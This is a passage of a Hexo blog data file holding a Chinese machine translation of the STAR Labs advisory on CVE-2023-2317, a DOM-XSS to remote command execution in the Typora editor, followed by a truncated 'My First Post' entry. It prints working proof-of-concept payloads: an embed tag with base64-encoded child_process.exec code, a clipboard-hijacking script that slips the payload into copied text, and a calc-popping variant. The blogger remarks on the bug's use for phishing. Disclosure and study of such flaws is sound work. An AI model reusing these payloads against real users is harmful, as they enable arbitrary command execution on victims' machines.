加载到标签内`typora://app/typemark/updater/updater.html`。在这种情况下，`typora://app/typemark/window.html`在主窗口中加载的内容和嵌入的更新程序页面被视为同源。因此，更新程序能够访问暴露于主窗口的特权接口，例如`reqnode`.\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_02.updater-and-main-window-are-same-origin.png)\n\n通过嵌入带有精心设计的 DOM-XSS 负载的 updater.html URL，攻击者能够在主窗口上执行任意 JavaScript 代码。此外，攻击者可以使用`reqnode`主窗口中的特权界面来访问节点模块`child_process`并执行任意系统命令。\n\n\n## 利用条件：\n\n可以通过诱使受害者\n1.  在 Typora 中打开恶意 Markdown 文件\n2.  从恶意网页复制文本并将其粘贴到 Typora 中来利用此漏洞。\n\n\n## POC:\n我们已尽力使 PoC 尽可能便携。以下 HTML 代码是演示此任意文件泄露漏洞的 PoC：\n\n```html\n<embed src=\"typora://app/typemark/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgJVdJTkRJUiUvd2luLmluaScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p'))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]\"></embed>\n```\n\nPoC中的base64编码部分被解码为以下内容：\n\n```javascript\nreqnode('child_process').exec(({Win32: 'notepad %WINDIR%/win.ini', Linux: 'gnome-calculator -e \"Typora RCE PoC\"'})[navigator.platform.substr(0,5)])\n```\n\n当这个 PoC 加载到 Typora 中时，它将：\n\n1. 使用 DOM-XSS 负载加载 updater.html\n2. 有效负载在主窗口上执行 JavaScript 代码\n3. 执行系统命令：`notepad`在Windows上，或`gnome-calculator`在Linux上\n\n\n## 攻击场景：\n\n### 场景一：打开恶意markdown文件\n\n攻击者可以在 Markdown 文件中注入嵌入标签，并说服受害者在 Typora 中打开它以触发有效负载。\n\n我们附上`poc/typora-1.5.12-rce.md`这份报告以供演示。在受影响的 Typora 版本中打开文件以验证此漏洞。\n\n以下是在 Windows 和 Ubuntu 上展示此场景的 GIF：\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_03.open-file-on-Windows.gif)\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_04.open-file-on-Ubuntu.gif)\n\n### 场景 2：从网页复制并粘贴\n\n`copy`攻击者可以制作恶意网页并使用以下代码来挂钩该事件：\n\n```html\n<script>\n    document.addEventListener('copy',e=>{\n        e.preventDefault();\n        let payload = atob('JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJ0eXBvcmE6Ly9hcHAvdHlwZW1hcmsvdXBkYXRlci91cGRhdGVyLmh0bWw/Y3VyVmVyc2lvbj0xMTEmbmV3VmVyc2lvbj0yMjImcmVsZWFzZU5vdGVMaW5rPTMzMyZoaWRlQXV0b1VwZGF0ZXM9ZmFsc2UmbGFiZWxzPVslMjIlMjIsJTIyJTNjc3ZnJTJmb25sb2FkPXRvcC5ldmFsKGF0b2IoJ2NtVnhibTlrWlNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTW9LSHRYYVc0ek1qb2dKMjV2ZEdWd1lXUWdKVmRKVGtSSlVpVXZkMmx1TG1sdWFTY3NJRXhwYm5WNE9pQW5aMjV2YldVdFkyRnNZM1ZzWVhSdmNpQXRaU0FpVkhsd2IzSmhJRkpEUlNCUWIwTWlKMzBwVzI1aGRtbG5ZWFJ2Y2k1d2JHRjBabTl5YlM1emRXSnpkSElvTUN3MUtWMHAnKSk+PCUyZnN2Zz4lMjIsJTIyJTIyLCUyMiUyMiwlMjIlMjIsJTIyJTIyXSI+JiN4MGQ7JiN4MGQ7');\n        e.clipboardData.setData('text/markhtml', `\\x20\\x0d\\x0a\\x0d\\x0a` + payload + window.getSelection());\n        console.log(payload + window.getSelection())\n    })\n</script>\n```\n\n当受害者从该页面复制文本时，有效负载会添加到复制的内容中，并在粘贴到 Typora 时触发。\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_05.copy-paste-on-Windows.gif)\n\n![](https://starlabs.sg/advisories/23/images/CVE-2023-2317_06.copy-paste-on-Ubuntu.gif)\n\n我们已附上`poc/rce-cp.html`此场景的 PoC。[现场版本也可以在这里](https://o.cal1.cn/f0a97fdef8028595-typora-poc/rce-cp.html)找到。\n\n### 补充笔记：\n\n1. 攻击者可以在`<embed>`标签上设置自定义样式，以使漏洞利用变得不那么引人注目。例如，`height:0;`在场景2 PoC中用于隐藏嵌入的网页。\n\n## 建议的缓解措施：\n\n建议通过设置`innerText`而不是 来更新 HTML 元素`innerHTML`。\n\n对于使用受此漏洞影响的版本的最终用户，建议（1）不要在 Typora 中打开任何不受信任的 Markdown 文件，（2）应避免从不受信任的网页复制文本然后将其粘贴到 Typora 中。\n\n\n## 经典复现：\nwindows改成了弹计算器版本。\n\n```html\n<embed src=\"typora://app/typemark/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ=='))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]\"></embed>\n```\n\n\n\n\n","slug":"CVE-2023-2317(typora远程命令执行)复现","published":1,"updated":"2023-08-30T15:23:20.878Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllyqxkz300011ao53je89ygl","content":"<h2 id=\"原文在这\"><a href=\"#原文在这\" class=\"headerlink\" title=\"原文在这\"></a><a href='https://starlabs.sg/advisories/23/23-2317/'>原文在这</a></h2><blockquote>\n<p>以下为机翻，发布用以个人学习方便之需。<br>此漏洞在钓鱼、反制等领域都有一定意义。</p>\n</blockquote>\n<h2 id=\"产品概述：\"><a href=\"#产品概述：\" class=\"headerlink\" title=\"产品概述：\"></a>产品概述：</h2><p>Typora 是一款流行的跨平台 Markdown 编辑器，允许用户创建和编辑具有实时预览功能的 Markdown 文件。它支持各种格式选项，例如标题、粗体、斜体等。Typora 还允许用户将 Markdown 文件导出为不同的格式，例如 PDF、HTML 和 Word。</p>\n<p>适用于 Windows&#x2F;Linux 的 Typora 基于 Electron 构建，该框架使其能够在各种操作系统上无缝运行。Markdown 编辑器支持 HTML 标签和嵌入​​外部网页。攻击者可以利用该漏洞通过在 Markdown 编辑器中加载精心设计的 URL 来执行任意 JavaScript 代码和系统命令。</p>\n<h2 id=\"漏洞摘要\"><a href=\"#漏洞摘要\" class=\"headerlink\" title=\"漏洞摘要:\"></a>漏洞摘要:</h2><p>Windows&#x2F;Linux 版 Typora 中存在基于 DOM 的 XSS，允许任意 JavaScript 代码在 Typora 主窗口上下文中运行。如果用户在 Typora 中打开恶意 Markdown 文件，或者从恶意网页复制文本并将其粘贴到 Typora 中，则可以利用此漏洞。</p>\n<h2 id=\"漏洞详细信息：\"><a href=\"#漏洞详细信息：\" class=\"headerlink\" title=\"漏洞详细信息：\"></a>漏洞详细信息：</h2><p>已在以下位置发现基于 DOM 的 XSS <code>Typora/resources/updater/updater.html</code>：</p>\n<pre><code class=\"html\">    &lt;div class=&quot;btn-group&quot;&gt;\n      &lt;div id=&quot;skip-this-version-btn-group&quot; style=&quot;flex-grow: 2; min-height: 10px;min-width: 10px;&quot;&gt;\n        &lt;button onClick=&quot;onSkipUpdate()&quot; data-label=&quot;1&quot; &gt;Skip This Version&lt;/button&gt;\n      &lt;/div&gt;\n      \n      &lt;button onClick=&quot;onCancelUpdate()&quot; data-label=&quot;2&quot; &gt;Remind Me Later&lt;/button&gt;\n      &lt;button class=&quot;btn-primary&quot; onClick=&quot;onDownloadUpdate()&quot; data-label=&quot;3&quot; &gt;Download Update&lt;/button&gt;\n    &lt;/div&gt;\n\n    &lt;script type=&quot;text/javascript&quot;&gt;\n      // ...\n      var labels = JSON.parse(decodeURIComponent(/[?&amp;]labels=([^&amp;]+)/.exec(window.location.search)[1]));        // [1]\n\n      document.querySelector(&quot;#sum&quot;).innerText = labels[4] + &quot; &quot; + labels[5].replace(&quot;$1&quot;, newVersion).replace(&quot;$2&quot;, curVersion);\n      document.querySelectorAll(&quot;[data-label]&quot;).forEach(function(dom)&#123;\n        dom.innerHTML = labels[dom.getAttribute(&quot;data-label&quot;) - 0];     // [2]\n      &#125;);\n      // ...\n    &lt;/script&gt;\n</code></pre>\n<p>在上面的代码片段中，变量<code>labels</code>是从<code>location.search</code>at中提取的<code>[1]</code>，然后分配给具有at 属性的<code>innerHTML</code>元素。<code>data-label``[2]</code></p>\n<p>这是一个将<code>&lt;input&gt;</code>标签注入 DOM 的 PoC：</p>\n<pre><code>updater.html?curVersion=1&amp;newVersion=2&amp;releaseNoteLink=3&amp;hideAutoUpdates=false&amp;labels=[&quot;&lt;input%20value=test&gt;&quot;,&quot;22&quot;,&quot;33&quot;,&quot;44&quot;,&quot;55&quot;,&quot;66&quot;,&quot;77&quot;]\n</code></pre>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_01.updater-html-DOM-XSS.png\"></p>\n<p>Typora 注册了一个文件处理程序<code>typora://</code>来加载本地资源。例如，主窗口的 URL 是<code>typora://app/typemark/window.html</code>，实际文件是从 加载的<code>[Typora Installation Absolute Path]/resources/window.html</code>。</p>\n<p>攻击者可以<code>&lt;embed&gt;</code>通过将<code>src</code>属性设置为 来将存在漏洞的 updater.html 加载到标签内<code>typora://app/typemark/updater/updater.html</code>。在这种情况下，<code>typora://app/typemark/window.html</code>在主窗口中加载的内容和嵌入的更新程序页面被视为同源。因此，更新程序能够访问暴露于主窗口的特权接口，例如<code>reqnode</code>.</p>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_02.updater-and-main-window-are-same-origin.png\"></p>\n<p>通过嵌入带有精心设计的 DOM-XSS 负载的 updater.html URL，攻击者能够在主窗口上执行任意 JavaScript 代码。此外，攻击者可以使用<code>reqnode</code>主窗口中的特权界面来访问节点模块<code>child_process</code>并执行任意系统命令。</p>\n<h2 id=\"利用条件：\"><a href=\"#利用条件：\" class=\"headerlink\" title=\"利用条件：\"></a>利用条件：</h2><p>可以通过诱使受害者</p>\n<ol>\n<li>在 Typora 中打开恶意 Markdown 文件</li>\n<li>从恶意网页复制文本并将其粘贴到 Typora 中来利用此漏洞。</li>\n</ol>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC:\"></a>POC:</h2><p>我们已尽力使 PoC 尽可能便携。以下 HTML 代码是演示此任意文件泄露漏洞的 PoC：</p>\n<pre><code class=\"html\">&lt;embed src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#39;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgJVdJTkRJUiUvd2luLmluaScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p&#39;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;&lt;/embed&gt;\n</code></pre>\n<p>PoC中的base64编码部分被解码为以下内容：</p>\n<pre><code class=\"javascript\">reqnode(&#39;child_process&#39;).exec((&#123;Win32: &#39;notepad %WINDIR%/win.ini&#39;, Linux: &#39;gnome-calculator -e &quot;Typora RCE PoC&quot;&#39;&#125;)[navigator.platform.substr(0,5)])\n</code></pre>\n<p>当这个 PoC 加载到 Typora 中时，它将：</p>\n<ol>\n<li>使用 DOM-XSS 负载加载 updater.html</li>\n<li>有效负载在主窗口上执行 JavaScript 代码</li>\n<li>执行系统命令：<code>notepad</code>在Windows上，或<code>gnome-calculator</code>在Linux上</li>\n</ol>\n<h2 id=\"攻击场景：\"><a href=\"#攻击场景：\" class=\"headerlink\" title=\"攻击场景：\"></a>攻击场景：</h2><h3 id=\"场景一：打开恶意markdown文件\"><a href=\"#场景一：打开恶意markdown文件\" class=\"headerlink\" title=\"场景一：打开恶意markdown文件\"></a>场景一：打开恶意markdown文件</h3><p>攻击者可以在 Markdown 文件中注入嵌入标签，并说服受害者在 Typora 中打开它以触发有效负载。</p>\n<p>我们附上<code>poc/typora-1.5.12-rce.md</code>这份报告以供演示。在受影响的 Typora 版本中打开文件以验证此漏洞。</p>\n<p>以下是在 Windows 和 Ubuntu 上展示此场景的 GIF：</p>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_03.open-file-on-Windows.gif\"></p>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_04.open-file-on-Ubuntu.gif\"></p>\n<h3 id=\"场景-2：从网页复制并粘贴\"><a href=\"#场景-2：从网页复制并粘贴\" class=\"headerlink\" title=\"场景 2：从网页复制并粘贴\"></a>场景 2：从网页复制并粘贴</h3><p><code>copy</code>攻击者可以制作恶意网页并使用以下代码来挂钩该事件：</p>\n<pre><code class=\"html\">&lt;script&gt;\n    document.addEventListener(&#39;copy&#39;,e=&gt;&#123;\n        e.preventDefault();\n        let payload = atob(&#39;JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJ0eXBvcmE6Ly9hcHAvdHlwZW1hcmsvdXBkYXRlci91cGRhdGVyLmh0bWw/Y3VyVmVyc2lvbj0xMTEmbmV3VmVyc2lvbj0yMjImcmVsZWFzZU5vdGVMaW5rPTMzMyZoaWRlQXV0b1VwZGF0ZXM9ZmFsc2UmbGFiZWxzPVslMjIlMjIsJTIyJTNjc3ZnJTJmb25sb2FkPXRvcC5ldmFsKGF0b2IoJ2NtVnhibTlrWlNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTW9LSHRYYVc0ek1qb2dKMjV2ZEdWd1lXUWdKVmRKVGtSSlVpVXZkMmx1TG1sdWFTY3NJRXhwYm5WNE9pQW5aMjV2YldVdFkyRnNZM1ZzWVhSdmNpQXRaU0FpVkhsd2IzSmhJRkpEUlNCUWIwTWlKMzBwVzI1aGRtbG5ZWFJ2Y2k1d2JHRjBabTl5YlM1emRXSnpkSElvTUN3MUtWMHAnKSk+PCUyZnN2Zz4lMjIsJTIyJTIyLCUyMiUyMiwlMjIlMjIsJTIyJTIyXSI+JiN4MGQ7JiN4MGQ7&#39;);\n        e.clipboardData.setData(&#39;text/markhtml&#39;, `\\x20\\x0d\\x0a\\x0d\\x0a` + payload + window.getSelection());\n        console.log(payload + window.getSelection())\n    &#125;)\n&lt;/script&gt;\n</code></pre>\n<p>当受害者从该页面复制文本时，有效负载会添加到复制的内容中，并在粘贴到 Typora 时触发。</p>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_05.copy-paste-on-Windows.gif\"></p>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_06.copy-paste-on-Ubuntu.gif\"></p>\n<p>我们已附上<code>poc/rce-cp.html</code>此场景的 PoC。<a href=\"https://o.cal1.cn/f0a97fdef8028595-typora-poc/rce-cp.html\">现场版本也可以在这里</a>找到。</p>\n<h3 id=\"补充笔记：\"><a href=\"#补充笔记：\" class=\"headerlink\" title=\"补充笔记：\"></a>补充笔记：</h3><ol>\n<li>攻击者可以在<code>&lt;embed&gt;</code>标签上设置自定义样式，以使漏洞利用变得不那么引人注目。例如，<code>height:0;</code>在场景2 PoC中用于隐藏嵌入的网页。</li>\n</ol>\n<h2 id=\"建议的缓解措施：\"><a href=\"#建议的缓解措施：\" class=\"headerlink\" title=\"建议的缓解措施：\"></a>建议的缓解措施：</h2><p>建议通过设置<code>innerText</code>而不是 来更新 HTML 元素<code>innerHTML</code>。</p>\n<p>对于使用受此漏洞影响的版本的最终用户，建议（1）不要在 Typora 中打开任何不受信任的 Markdown 文件，（2）应避免从不受信任的网页复制文本然后将其粘贴到 Typora 中。</p>\n<h2 id=\"经典复现：\"><a href=\"#经典复现：\" class=\"headerlink\" title=\"经典复现：\"></a>经典复现：</h2><p>windows改成了弹计算器版本。</p>\n<pre><code class=\"html\">&lt;embed src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#39;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#39;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;&lt;/embed&gt;\n</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"原文在这\"><a href=\"#原文在这\" class=\"headerlink\" title=\"原文在这\"></a><a href='https://starlabs.sg/advisories/23/23-2317/'>原文在这</a></h2><blockquote>\n<p>以下为机翻，发布用以个人学习方便之需。<br>此漏洞在钓鱼、反制等领域都有一定意义。</p>\n</blockquote>\n<h2 id=\"产品概述：\"><a href=\"#产品概述：\" class=\"headerlink\" title=\"产品概述：\"></a>产品概述：</h2><p>Typora 是一款流行的跨平台 Markdown 编辑器，允许用户创建和编辑具有实时预览功能的 Markdown 文件。它支持各种格式选项，例如标题、粗体、斜体等。Typora 还允许用户将 Markdown 文件导出为不同的格式，例如 PDF、HTML 和 Word。</p>\n<p>适用于 Windows&#x2F;Linux 的 Typora 基于 Electron 构建，该框架使其能够在各种操作系统上无缝运行。Markdown 编辑器支持 HTML 标签和嵌入​​外部网页。攻击者可以利用该漏洞通过在 Markdown 编辑器中加载精心设计的 URL 来执行任意 JavaScript 代码和系统命令。</p>\n<h2 id=\"漏洞摘要\"><a href=\"#漏洞摘要\" class=\"headerlink\" title=\"漏洞摘要:\"></a>漏洞摘要:</h2><p>Windows&#x2F;Linux 版 Typora 中存在基于 DOM 的 XSS，允许任意 JavaScript 代码在 Typora 主窗口上下文中运行。如果用户在 Typora 中打开恶意 Markdown 文件，或者从恶意网页复制文本并将其粘贴到 Typora 中，则可以利用此漏洞。</p>\n<h2 id=\"漏洞详细信息：\"><a href=\"#漏洞详细信息：\" class=\"headerlink\" title=\"漏洞详细信息：\"></a>漏洞详细信息：</h2><p>已在以下位置发现基于 DOM 的 XSS <code>Typora/resources/updater/updater.html</code>：</p>\n<pre><code class=\"html\">    &lt;div class=&quot;btn-group&quot;&gt;\n      &lt;div id=&quot;skip-this-version-btn-group&quot; style=&quot;flex-grow: 2; min-height: 10px;min-width: 10px;&quot;&gt;\n        &lt;button onClick=&quot;onSkipUpdate()&quot; data-label=&quot;1&quot; &gt;Skip This Version&lt;/button&gt;\n      &lt;/div&gt;\n      \n      &lt;button onClick=&quot;onCancelUpdate()&quot; data-label=&quot;2&quot; &gt;Remind Me Later&lt;/button&gt;\n      &lt;button class=&quot;btn-primary&quot; onClick=&quot;onDownloadUpdate()&quot; data-label=&quot;3&quot; &gt;Download Update&lt;/button&gt;\n    &lt;/div&gt;\n\n    &lt;script type=&quot;text/javascript&quot;&gt;\n      // ...\n      var labels = JSON.parse(decodeURIComponent(/[?&amp;]labels=([^&amp;]+)/.exec(window.location.search)[1]));        // [1]\n\n      document.querySelector(&quot;#sum&quot;).innerText = labels[4] + &quot; &quot; + labels[5].replace(&quot;$1&quot;, newVersion).replace(&quot;$2&quot;, curVersion);\n      document.querySelectorAll(&quot;[data-label]&quot;).forEach(function(dom)&#123;\n        dom.innerHTML = labels[dom.getAttribute(&quot;data-label&quot;) - 0];     // [2]\n      &#125;);\n      // ...\n    &lt;/script&gt;\n</code></pre>\n<p>在上面的代码片段中，变量<code>labels</code>是从<code>location.search</code>at中提取的<code>[1]</code>，然后分配给具有at 属性的<code>innerHTML</code>元素。<code>data-label``[2]</code></p>\n<p>这是一个将<code>&lt;input&gt;</code>标签注入 DOM 的 PoC：</p>\n<pre><code>updater.html?curVersion=1&amp;newVersion=2&amp;releaseNoteLink=3&amp;hideAutoUpdates=false&amp;labels=[&quot;&lt;input%20value=test&gt;&quot;,&quot;22&quot;,&quot;33&quot;,&quot;44&quot;,&quot;55&quot;,&quot;66&quot;,&quot;77&quot;]\n</code></pre>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_01.updater-html-DOM-XSS.png\"></p>\n<p>Typora 注册了一个文件处理程序<code>typora://</code>来加载本地资源。例如，主窗口的 URL 是<code>typora://app/typemark/window.html</code>，实际文件是从 加载的<code>[Typora Installation Absolute Path]/resources/window.html</code>。</p>\n<p>攻击者可以<code>&lt;embed&gt;</code>通过将<code>src</code>属性设置为 来将存在漏洞的 updater.html 加载到标签内<code>typora://app/typemark/updater/updater.html</code>。在这种情况下，<code>typora://app/typemark/window.html</code>在主窗口中加载的内容和嵌入的更新程序页面被视为同源。因此，更新程序能够访问暴露于主窗口的特权接口，例如<code>reqnode</code>.</p>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_02.updater-and-main-window-are-same-origin.png\"></p>\n<p>通过嵌入带有精心设计的 DOM-XSS 负载的 updater.html URL，攻击者能够在主窗口上执行任意 JavaScript 代码。此外，攻击者可以使用<code>reqnode</code>主窗口中的特权界面来访问节点模块<code>child_process</code>并执行任意系统命令。</p>\n<h2 id=\"利用条件：\"><a href=\"#利用条件：\" class=\"headerlink\" title=\"利用条件：\"></a>利用条件：</h2><p>可以通过诱使受害者</p>\n<ol>\n<li>在 Typora 中打开恶意 Markdown 文件</li>\n<li>从恶意网页复制文本并将其粘贴到 Typora 中来利用此漏洞。</li>\n</ol>\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC:\"></a>POC:</h2><p>我们已尽力使 PoC 尽可能便携。以下 HTML 代码是演示此任意文件泄露漏洞的 PoC：</p>\n<pre><code class=\"html\">&lt;embed src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#39;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgJVdJTkRJUiUvd2luLmluaScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p&#39;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;&lt;/embed&gt;\n</code></pre>\n<p>PoC中的base64编码部分被解码为以下内容：</p>\n<pre><code class=\"javascript\">reqnode(&#39;child_process&#39;).exec((&#123;Win32: &#39;notepad %WINDIR%/win.ini&#39;, Linux: &#39;gnome-calculator -e &quot;Typora RCE PoC&quot;&#39;&#125;)[navigator.platform.substr(0,5)])\n</code></pre>\n<p>当这个 PoC 加载到 Typora 中时，它将：</p>\n<ol>\n<li>使用 DOM-XSS 负载加载 updater.html</li>\n<li>有效负载在主窗口上执行 JavaScript 代码</li>\n<li>执行系统命令：<code>notepad</code>在Windows上，或<code>gnome-calculator</code>在Linux上</li>\n</ol>\n<h2 id=\"攻击场景：\"><a href=\"#攻击场景：\" class=\"headerlink\" title=\"攻击场景：\"></a>攻击场景：</h2><h3 id=\"场景一：打开恶意markdown文件\"><a href=\"#场景一：打开恶意markdown文件\" class=\"headerlink\" title=\"场景一：打开恶意markdown文件\"></a>场景一：打开恶意markdown文件</h3><p>攻击者可以在 Markdown 文件中注入嵌入标签，并说服受害者在 Typora 中打开它以触发有效负载。</p>\n<p>我们附上<code>poc/typora-1.5.12-rce.md</code>这份报告以供演示。在受影响的 Typora 版本中打开文件以验证此漏洞。</p>\n<p>以下是在 Windows 和 Ubuntu 上展示此场景的 GIF：</p>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_03.open-file-on-Windows.gif\"></p>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_04.open-file-on-Ubuntu.gif\"></p>\n<h3 id=\"场景-2：从网页复制并粘贴\"><a href=\"#场景-2：从网页复制并粘贴\" class=\"headerlink\" title=\"场景 2：从网页复制并粘贴\"></a>场景 2：从网页复制并粘贴</h3><p><code>copy</code>攻击者可以制作恶意网页并使用以下代码来挂钩该事件：</p>\n<pre><code class=\"html\">&lt;script&gt;\n    document.addEventListener(&#39;copy&#39;,e=&gt;&#123;\n        e.preventDefault();\n        let payload = atob(&#39;JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJ0eXBvcmE6Ly9hcHAvdHlwZW1hcmsvdXBkYXRlci91cGRhdGVyLmh0bWw/Y3VyVmVyc2lvbj0xMTEmbmV3VmVyc2lvbj0yMjImcmVsZWFzZU5vdGVMaW5rPTMzMyZoaWRlQXV0b1VwZGF0ZXM9ZmFsc2UmbGFiZWxzPVslMjIlMjIsJTIyJTNjc3ZnJTJmb25sb2FkPXRvcC5ldmFsKGF0b2IoJ2NtVnhibTlrWlNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTW9LSHRYYVc0ek1qb2dKMjV2ZEdWd1lXUWdKVmRKVGtSSlVpVXZkMmx1TG1sdWFTY3NJRXhwYm5WNE9pQW5aMjV2YldVdFkyRnNZM1ZzWVhSdmNpQXRaU0FpVkhsd2IzSmhJRkpEUlNCUWIwTWlKMzBwVzI1aGRtbG5ZWFJ2Y2k1d2JHRjBabTl5YlM1emRXSnpkSElvTUN3MUtWMHAnKSk+PCUyZnN2Zz4lMjIsJTIyJTIyLCUyMiUyMiwlMjIlMjIsJTIyJTIyXSI+JiN4MGQ7JiN4MGQ7&#39;);\n        e.clipboardData.setData(&#39;text/markhtml&#39;, `\\x20\\x0d\\x0a\\x0d\\x0a` + payload + window.getSelection());\n        console.log(payload + window.getSelection())\n    &#125;)\n&lt;/script&gt;\n</code></pre>\n<p>当受害者从该页面复制文本时，有效负载会添加到复制的内容中，并在粘贴到 Typora 时触发。</p>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_05.copy-paste-on-Windows.gif\"></p>\n<p><img src=\"https://starlabs.sg/advisories/23/images/CVE-2023-2317_06.copy-paste-on-Ubuntu.gif\"></p>\n<p>我们已附上<code>poc/rce-cp.html</code>此场景的 PoC。<a href=\"https://o.cal1.cn/f0a97fdef8028595-typora-poc/rce-cp.html\">现场版本也可以在这里</a>找到。</p>\n<h3 id=\"补充笔记：\"><a href=\"#补充笔记：\" class=\"headerlink\" title=\"补充笔记：\"></a>补充笔记：</h3><ol>\n<li>攻击者可以在<code>&lt;embed&gt;</code>标签上设置自定义样式，以使漏洞利用变得不那么引人注目。例如，<code>height:0;</code>在场景2 PoC中用于隐藏嵌入的网页。</li>\n</ol>\n<h2 id=\"建议的缓解措施：\"><a href=\"#建议的缓解措施：\" class=\"headerlink\" title=\"建议的缓解措施：\"></a>建议的缓解措施：</h2><p>建议通过设置<code>innerText</code>而不是 来更新 HTML 元素<code>innerHTML</code>。</p>\n<p>对于使用受此漏洞影响的版本的最终用户，建议（1）不要在 Typora 中打开任何不受信任的 Markdown 文件，（2）应避免从不受信任的网页复制文本然后将其粘贴到 Typora 中。</p>\n<h2 id=\"经典复现：\"><a href=\"#经典复现：\" class=\"headerlink\" title=\"经典复现：\"></a>经典复现：</h2><p>windows改成了弹计算器版本。</p>\n<pre><code class=\"html\">&lt;embed src=&quot;typora://app/typemark/updater/updater.html?curVersion=111&amp;newVersion=222&amp;releaseNoteLink=333&amp;hideAutoUpdates=false&amp;labels=[%22%22,%22%3csvg%2fonload=top.eval(atob(&#39;cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==&#39;))&gt;&lt;%2fsvg&gt;%22,%22%22,%22%22,%22%22,%22%22]&quot;&gt;&lt;/embed&gt;\n</code></pre>\n"},{"title":"My First Post","date":"2023-08-20T08:18:48.000Z","_content":"Welcome to my blog.\n\n搭建了一天，终于上线了。\n\n暑假开始的时候有一个Plan，完成了个P,因为lan。\n\n后面会随缘更新，更新内容也不确定。凑合着看吧。","source":"_posts/My-First-Post.md","raw":"---\ntitle: My First Post\ndate: 2023-08-20 16:18:48\ncategories:  \n- Diary  \ntags:  \n- hello\n- blog\n---\nWelcome to my blog.\n\n搭建了一天，终于上线了。\n\n暑假开始的时候有一个Plan，完成了个P,因为lan。\n\n后面会随缘更新，更新内容也不确定。凑合着看吧。","slug":"My-First-Post","published":1,"updated":"2023-08-21T16:52:42.797Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cllyqxkz600031ao53kuh2o73","content":"<p>Welcome to my 